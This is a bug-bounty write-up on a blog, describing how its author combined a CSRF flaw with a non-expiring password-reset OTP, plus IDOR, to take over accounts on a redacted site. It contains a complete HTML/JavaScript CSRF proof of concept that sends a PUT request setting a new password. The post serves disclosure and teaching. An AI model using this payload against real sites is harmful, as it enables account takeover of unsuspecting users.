---
title: "Exploiting CSRF and OTP Reuse: How Weak Token Management Enables Password Reset Attacks, Leading…"
datePublished: Thu Nov 28 2024 18:38:31 GMT+0000 (Coordinated Universal Time)
cuid: cm8slnmcl001k09jo46ic40px
slug: exploiting-csrf-and-otp-reuse-how-weak-token-management-enables-password-reset-attacks-leading-to-c2f6b914f398
tags: [hunt,CSRF]
publish: true
---

Hello guy! I’m iPsalmy. It’s been a while I wrote anything here.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1743155290085/d323921f-4d60-4437-8c23-af12794cbd58.gif)

Anyway, with no waste of time let’s talk about how I used a simple CSRF attack to exploit a weak token management which led to me taking over users account.

I tend to test on password password reset mechanisms and IDOR more these days. So, while checking out the functionality on this website, let’s call it (redacted.com). I intercepted the forgot password request in Caido (web proxy), forwarded the request inorder to receive the token(OTP) in my mail.

With the token, I created a CSRF POC for this request.

<!DOCTYPE html>  
<html>  
<head>  
    <title>CSRF PoC for Password Reset</title>  
</head>  
<body>  
    <h1>CSRF PoC for Password Reset</h1>  
  
    <script>  
        // This JavaScript will create and send the PUT request with the JSON payload  
        fetch("https://redacted.com/v1/user/set-new-password/", {  
            method: "PUT",  
            headers: {  
                "Content-Type": "application/json"  
            },  
            body: JSON.stringify({  
                "email": "ipsalmy+40@gmail.com",  
                "otp\_code": "954195",  
                "password": "Weakpass2"  
            })  
        });  
    </script>  
</body>  
</html>  
  

Entered a password of my choice in the CSRF POC, saved this POC as .html file and launched it on my browser.

I went back to the login page of redacted.com and I tried to login with my previous password but couldn’t. Meaning…..

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1743155291808/d0f22ae4-e47c-4da4-a34d-493c0a3a4d1e.gif)

The CSRF worked! I got logged out of my account.

Now, to the most fun part. The token sent to to user’s mail wasn’t expiring even after use, meaning I was able to change users password thousands of times with the same token. Since it was provided by the website’s reset password API endpoint, it remained valid.

This happened only when used with a CSRF exploitation. If the Token is manually inputted, the API properly validates this token and made it expire after usage.

I was also able to perform this attack on other users I found through IDOR.

Thanks for reading : )

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1743155294068/061e142e-0f91-45ef-a5db-fdd93320282a.gif)